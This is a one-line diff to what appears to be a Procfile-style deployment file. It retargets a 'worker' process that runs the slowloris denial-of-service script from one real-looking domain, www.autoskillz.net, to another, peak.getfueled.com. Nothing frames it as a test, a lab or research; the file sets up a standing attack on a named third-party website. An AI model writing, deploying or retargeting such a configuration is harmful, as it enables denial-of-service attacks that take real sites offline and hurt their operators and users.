@@ -1,1 +1,1 @@
-worker: python3 slowloris.py www.autoskillz.net -ua
+worker: python3 slowloris.py peak.getfueled.com -ua
